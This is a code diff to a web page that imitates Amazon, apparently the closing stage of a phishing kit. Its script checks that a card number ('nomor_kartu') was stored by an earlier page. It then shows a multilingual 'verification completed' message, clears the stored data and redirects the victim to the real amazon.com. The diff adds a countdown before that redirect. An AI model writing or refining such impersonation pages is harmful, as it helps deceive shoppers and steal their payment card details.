@@ -42,15 +42,16 @@
         .back-top { text-align: center; padding: 15px; border-top: 1px solid #e7e7e7; font-size: 12px; color: #555; cursor: pointer; margin: 20px 0; }
         
         /* === FOOTER === */
-        .footer { background: #232f3e; color: #fff; padding: 40px 20px 20px; }
+        .footer { background: #232f3e; color: #fff; padding: 40px 20px 20px; margin-top: auto; }
         .footer-inner { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; margin-bottom: 30px; }
         .footer h4 { font-size: 14px; margin-bottom: 12px; }
         .footer a { display: block; color: #ddd; font-size: 12px; text-decoration: none; margin-bottom: 6px; }
         .footer a:hover { text-decoration: underline; }
         .footer-bawah { text-align: center; padding-top: 20px; border-top: 1px solid #3a4553; font-size: 12px; color: #aaa; }
-        .footer-bawah .logo-bawah { margin: 10px 0; }
-        .pilihan-bawah { display: flex; justify-content: center; gap: 15px; margin: 10px 0; }
+        .footer-bawah .logo-bawah { margin: 10px 0; font-size: 20px; font-weight: 700; }
+        .pilihan-bawah { display: flex; justify-content: center; gap: 15px; margin: 10px 0; flex-wrap: wrap; }
         .pilihan-bawah select { padding: 4px 8px; border-radius: 4px; border: 1px solid #555; background: transparent; color: #fff; font-size: 12px; }
+        .hitung-mundur { text-align: center; margin-top: 15px; font-size: 13px; color: #555; }
     </style>
 </head>
 <body>
@@ -66,9 +67,7 @@
                 </div>
             </div>
             <div class="search-bar">
-                <select>
-                    <option>All</option>
-                </select>
+                <select><option>All</option></select>
                 <input type="text" placeholder="Search Amazon">
                 <button class="search-btn">🔍</button>
             </div>
@@ -120,6 +119,7 @@
                 <p>• <span id="pesanSukses">We will notify you via email message as soon as your account will be verified.</span></p>
             </div>
         </div>
+        <div class="hitung-mundur" id="mundur">Redirecting to Amazon in <b>5</b> seconds...</div>
     </div>
 
     <div class="back-top" id="kembaliKeAtas">Back to top</div>
@@ -200,6 +200,7 @@ const terjemahan = {
     judulSukses:'Your Verification Completed',
     pesanSukses:'We will notify you via email message as soon as your account will be verified.',
     kembaliKeAtas:'Back to top',
+    pengalihan:'Redirecting to Amazon in', detik:'seconds',
     judulKenalKami:'Get to Know Us', linkKarir:'Careers', linkBlog:'Blog', linkTentang:'About Amazon',
     linkInvestor:'Investor Relations', linkPerangkat:'Amazon Devices', linkSains:'Amazon Science',
     judulHasilkan:'Make Money with Us', linkJualProduk:'Sell products on Amazon',
@@ -218,6 +219,7 @@ const terjemahan = {
     judulSukses:'Verifikasi Anda Telah Selesai',
     pesanSukses:'Kami akan mengirimkan pemberitahuan melalui email segera setelah akun Anda diverifikasi.',
     kembaliKeAtas:'Kembali ke atas',
+    pengalihan:'Mengalihkan ke Amazon dalam', detik:'detik',
     judulKenalKami:'Kenali Kami', linkKarir:'Karir', linkBlog:'Blog', linkTentang:'Tentang Amazon',
     linkInvestor:'Hubungan Investor', linkPerangkat:'Perangkat Amazon', linkSains:'Sains Amazon',
     judulHasilkan:'Cara Menghasilkan Uang', linkJualProduk:'Jual Produk di Amazon',
@@ -236,6 +238,7 @@ const terjemahan = {
     judulSukses:'確認が完了しました',
     pesanSukses:'アカウント確認が完了次第、メールでお知らせいたします。',
     kembaliKeAtas:'ページ上部へ',
+    pengalihan:'Amazonへ移動します', detik:'秒',
     judulKenalKami:'Amazonについて', linkKarir:'採用情報', linkBlog:'ブログ', linkTentang:'Amazonについて',
     linkInvestor:'投資家情報', linkPerangkat:'Amazonデバイス', linkSains:'Amazonサイエンス',
     judulHasilkan:'Amazonで稼ぐ', linkJualProduk:'商品を売る',
@@ -254,6 +257,7 @@ const terjemahan = {
     judulSukses:'验证已完成',
     pesanSukses:'账户验证完成后，我们将通过邮件通知您。',
     kembaliKeAtas:'回到顶部',
+    pengalihan:'正在跳转至亚马逊', detik:'秒',
     judulKenalKami:'了解我们', linkKarir:'招聘', linkBlog:'博客', linkTentang:'关于我们',
     linkInvestor:'投资者关系', linkPerangkat:'设备', linkSains:'亚马逊科学',
     judulHasilkan:'赚钱', linkJualProduk:'开店',
@@ -272,6 +276,7 @@ const terjemahan = {
     judulSukses:'การยืนยันเสร็จสมบูรณ์',
     pesanSukses:'เราจะแจ้งให้ทราบทางอีเมลเมื่อบัญชีได้รับการยืนยัน',
     kembaliKeAtas:'กลับด้านบน',
+    pengalihan:'กำลังไปยัง Amazon ในอีก', detik:'วินาที',
     judulKenalKami:'รู้จักเรา', linkKarir:'ร่วมงาน', linkBlog:'บล็อก', linkTentang:'เกี่ยวกับเรา',
     linkInvestor:'นักลงทุน', linkPerangkat:'อุปกรณ์', linkSains:'วิทยาศาสตร์',
     judulHasilkan:'สร้างรายได้', linkJualProduk:'เปิดร้าน',
@@ -351,29 +356,39 @@ function terapkanBahasa(kode) {
   document.getElementById('linkKelola').textContent = t.linkKelola;
   document.getElementById('linkBantuan').textContent = t.linkBantuan;
   
-  // Pilih bahasa sesuai deteksi
   document.getElementById('pilihBahasa').value = kode;
 }
 
 document.addEventListener('DOMContentLoaded', async () => {
-  // Cek apakah sudah lewat tahap sebelumnya
-  if (!localStorage.getItem('nomor_kartu')) { window.location.href = 'amazon.html'; return; }
+  // Cek sesi
+  if (!localStorage.getItem('nomor_kartu')) { 
+    window.location.href = 'amazon.html'; 
+    return; 
+  }
   
   const lokasi = await deteksiLokasi();
   terapkanBahasa(lokasi.kodeBahasa);
   document.getElementById('deliverNegara').textContent = lokasi.namaNegara;
   
-  // Hapus data sesi setelah selesai
-  setTimeout(() => {
-    localStorage.clear();
-    // Alihkan ke Amazon setelah 5 detik
-    setTimeout(() => {
+  // Hapus semua data sesi
+  localStorage.clear();
+  
+  // Hitung mundur & alihkan
+  let detik = 5;
+  const elMundur = document.getElementById('mundur');
+  const t = terjemahan[lokasi.kodeBahasa] || terjemahan.en;
+  elMundur.innerHTML = `${t.pengalihan} <b>${detik}</b> ${t.detik}...`;
+  
+  const timer = setInterval(() => {
+    detik--;
+    elMundur.innerHTML = `${t.pengalihan} <b>${detik}</b> ${t.detik}...`;
+    if (detik <= 0) {
+      clearInterval(timer);
       window.location.href = 'https://www.amazon.com';
-    }, 5000);
-  }, 100);
+    }
+  }, 1000);
 });
 
-// Kembali ke atas
 document.getElementById('kembaliKeAtas').addEventListener('click', () => {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 });
